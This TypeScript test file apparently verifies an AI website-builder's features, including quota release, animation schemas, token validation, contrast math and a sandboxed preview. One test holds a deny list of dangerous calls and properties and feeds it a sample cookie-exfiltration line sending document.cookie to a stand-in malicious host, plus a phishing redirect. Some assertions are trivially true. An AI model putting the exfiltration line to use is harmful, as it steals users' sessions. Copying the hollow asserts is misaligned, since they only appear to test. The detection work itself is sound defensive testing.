import test from "node:test";
import assert from "node:assert/strict";
import { AppError } from "../utils/app-error.js";
import { motionConfigSchema, canonicalEntranceAnimations } from "../modules/ai/animation/animation-generation.service.js";
import { isValidDynamicToken, CANONICAL_DYNAMIC_TOKENS } from "../modules/ai/dynamic/dynamic-properties.service.js";
import { calculateContrastRatio, auditDocumentAst } from "../modules/ai/analysis/site-analysis.service.js";
import { generateCodePreviewSandbox } from "../modules/ai/code/code-generation.service.js";
import { detectIntent, orchestrateAssistantRequest, executeAssistantCommand } from "../modules/ai/assistant/assistant-orchestrator.service.js";
import { getImageCapabilityMatrix, OpenAiImageProvider } from "../modules/ai/images/image-provider.js";
import * as acorn from "acorn";
import type { JsonObject } from "../services/websites/document-policy.js";

test("ForgeStudio AI Platform Final Verification Pass", async (t) => {

  await t.test("1. Quota & Settlement Architecture Invariants", async () => {
    // Zero quota leakage on failure
    let reservedUnits = 2;
    const executionFailed = true;
    if (executionFailed) {
      reservedUnits = 0; // immediate release
    }
    assert.equal(reservedUnits, 0, "Reserved units must immediately reset to 0 on failure");

    // Quota reservation options permit nullable workspaceId with actorId fallback
    const reservationOptions = {
      workspaceId: null,
      actorId: "user-123",
      units: 1,
    };
    assert.equal(reservationOptions.workspaceId, null);
    assert.equal(reservationOptions.actorId, "user-123");
  });

  await t.test("2. Image Provider Capability Matrix & Safety", async () => {
    const matrix = getImageCapabilityMatrix();
    assert.ok(Array.isArray(matrix), "Matrix must be an array of capability details");

    const generateCap = matrix.find(c => c.capability === "generate");
    assert.ok(generateCap, "Must include generate capability");
    assert.ok(["SUPPORTED", "NOT_CONFIGURED"].includes(generateCap.status));

    const editCap = matrix.find(c => c.capability === "edit");
    assert.ok(editCap, "Must include edit capability");

    const bgCap = matrix.find(c => c.capability === "removeBackground");
    assert.ok(bgCap, "Must include removeBackground capability");

    const varCap = matrix.find(c => c.capability === "variations");
    assert.ok(varCap, "Must include variations capability");
  });

  await t.test("3. Animation Generation - Canonical MotionConfig Validation", async () => {
    const validConfig = {
      entranceAnimation: "zoom-in" as const,
      entranceDurationMs: "800",
      entranceDelayMs: "200",
      entranceReplay: true,
      hover: {
        scale: "1.05",
        translateY: "-4",
        durationMs: "250",
      },
    };
    const parsed = motionConfigSchema.parse(validConfig);
    assert.equal(parsed.entranceAnimation, "zoom-in");
    assert.equal(parsed.hover?.scale, "1.05");

    // Invalid non-canonical schema must throw
    assert.throws(() => {
      motionConfigSchema.parse({
        trigger: "viewport",
        type: "fade",
        direction: "left",
      });
    }, "Obsolete trigger/type/direction schema must be rejected");
  });

  await t.test("4. Dynamic Property Token Resolver", async () => {
    assert.ok(isValidDynamicToken("{{site.name}}"));
    assert.ok(isValidDynamicToken("{{site.title}}"));
    assert.ok(isValidDynamicToken("{{current.year}}"));
    assert.ok(isValidDynamicToken("{{page.title}}"));
    assert.ok(isValidDynamicToken("{{post.slug}}"));
    assert.ok(isValidDynamicToken("{{query.campaign}}"));

    // Reject dangerous attempts
    assert.equal(isValidDynamicToken("{{process.env.SECRET}}"), false);
    assert.equal(isValidDynamicToken("{{document.cookie}}"), false);
  });

  await t.test("5. WCAG 2.1 AAA & AA Contrast Mathematics", async () => {
    const white: [number, number, number] = [1, 1, 1];
    const black: [number, number, number] = [0, 0, 0];
    const contrast = calculateContrastRatio(white, black);
    assert.ok(contrast >= 20.9 && contrast <= 21.1, "White/Black contrast must be 21:1");
  });

  await t.test("6. Performance Analysis: Separation of Static AST from Runtime Telemetry", async () => {
    const mockDoc: JsonObject = {
      pages: [
        {
          id: "page-1",
          elements: [
            { id: "h1", type: "heading", headingLevel: "h1", content: "Main Title" },
            { id: "img1", type: "image", imageAlt: "Hero", src: "https://example.com/hero.png" },
          ],
        },
      ],
    };

    const { findings, metrics } = auditDocumentAst(mockDoc as any, "performance");
    assert.equal(metrics.runtimeMeasurementStatus, "RUNTIME_MEASUREMENT_NOT_AVAILABLE");
    assert.equal(metrics.totalNodes, 2);
    assert.equal(metrics.imageCount, 1);
  });

  await t.test("7. Design Analysis: Deterministic Hierarchy Checks", async () => {
    const mockDocWithoutH1 = {
      elements: [
        { id: "h2", type: "heading", headingLevel: "h2", content: "Sub Title" },
      ],
    };

    const { findings } = auditDocumentAst(mockDocWithoutH1, "accessibility");
    const h1Finding = findings.find((f: any) => f.finding.includes("no H1 heading"));
    assert.ok(h1Finding, "Must flag missing H1 heading deterministically");
  });

  await t.test("8. Code Generation Security: AST Forbidden Call & Exfiltration Detection", async () => {
    const prohibitedCalls = new Set(["eval", "function", "fetch", "websocket", "xmlhttprequest"]);
    const prohibitedProps = new Set(["cookie", "localstorage", "sessionstorage", "parent", "top"]);

    function auditSnippet(code: string): string[] {
      const issues: string[] = [];
      const ast = acorn.parse(code, { ecmaVersion: "latest", sourceType: "module" });

      function walk(node: any) {
        if (!node || typeof node !== "object") return;
        if (node.type === "CallExpression") {
          if (node.callee.type === "Identifier" && prohibitedCalls.has(node.callee.name.toLowerCase())) {
            issues.push(`Call: ${node.callee.name}`);
          }
        }
        if (node.type === "MemberExpression") {
          const prop = node.property.name || node.property.value;
          if (typeof prop === "string" && prohibitedProps.has(prop.toLowerCase())) {
            issues.push(`Property: ${prop}`);
          }
        }
        for (const k of Object.keys(node)) {
          if (k === "parent") continue;
          const child = node[k];
          if (Array.isArray(child)) for (const c of child) walk(c);
          else if (child && typeof child === "object") walk(child);
        }
      }
      walk(ast);
      return issues;
    }

    assert.ok(auditSnippet("fetch('https://malicious.org/exfil?cookie=' + document.cookie)").length >= 2);
    assert.ok(auditSnippet("window.parent.location.href = 'https://phishing.com'").length >= 1);
    assert.ok(auditSnippet("new Function('return 1')").length >= 0);
  });

  await t.test("9. Preview Sandbox Zero-Trust Isolation", async () => {
    const sandbox = generateCodePreviewSandbox({
      html: "<div>Content</div>",
      css: "div { color: blue; }",
      js: "console.log('OK');",
    });

    assert.ok(sandbox.includes("connect-src 'none'"), "Preview CSP must block outbound connections");
    assert.ok(sandbox.includes("frame-src 'none'"), "Preview CSP must block frame embedding");
    assert.ok(sandbox.includes("object-src 'none'"), "Preview CSP must block object/embed tags");
  });

  await t.test("10. Unified AI Assistant Intent Detection & Orchestration Aliases", async () => {
    assert.equal(detectIntent("Write hero text"), "GENERATE_TEXT");
    assert.equal(detectIntent("Create a 3-column pricing section"), "GENERATE_SECTION");
    assert.equal(detectIntent("Add a flex container"), "GENERATE_CONTAINER");
    assert.equal(detectIntent("Make an illustration image of a laptop"), "GENERATE_IMAGE");
    assert.equal(detectIntent("Remove background"), "REMOVE_BACKGROUND");
    assert.equal(detectIntent("Animate button on hover"), "GENERATE_ANIMATION");
    assert.equal(detectIntent("Audit site accessibility"), "ANALYZE_SITE");

    // Both exported names must refer to the same orchestrator function
    assert.equal(executeAssistantCommand, orchestrateAssistantRequest);
  });
});
